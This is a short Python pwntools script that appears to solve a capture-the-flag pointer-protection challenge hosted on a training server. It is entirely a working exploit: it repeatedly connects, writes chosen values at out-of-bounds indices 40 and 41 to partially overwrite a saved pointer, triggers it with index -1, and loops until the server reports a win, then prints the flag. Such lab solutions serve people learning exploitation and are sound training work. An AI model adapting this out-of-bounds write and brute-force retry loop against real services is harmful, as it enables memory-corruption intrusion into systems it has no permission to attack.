from pwn import *


while(1):
    p = remote('ptr-protection.training.offensivedefensive.it', 8080, ssl = True)
    
    p.recvuntil('index: ')
    p.sendline(str(40))
    
    p.recvuntil('data: ')
    p.sendline(str(124))
    
    p.recvuntil('index: ')
    p.sendline(str(41))
    
    p.recvuntil('data: ')
    p.sendline(str(0))
    
    p.recvuntil('index: ')
    p.sendline(str(-1))
    
    output = p.recvall(timeout = 1).decode()
    
    if "WIN!" in output:
        print("DONE")
        break

p.close()  
print(f"FLAG: {output}")  
